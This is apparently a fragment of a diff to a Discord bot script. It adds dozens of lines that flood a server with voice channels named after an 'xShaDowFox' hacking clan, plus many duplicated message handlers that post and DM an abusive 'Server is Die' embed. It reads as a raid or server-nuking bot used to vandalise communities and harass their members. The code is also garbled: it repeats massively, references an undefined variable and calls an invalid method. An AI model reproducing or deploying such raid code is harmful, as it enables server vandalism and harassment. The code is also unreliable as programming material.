-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
-m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
 m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
 m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
 m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
 m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
 m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
 m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
+
+
 
 
 
@@ -516,6 +921,1636 @@ m.createChannel('xShaDOWFOX CLAN IS HERE', 'voice');
 });
    
  
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
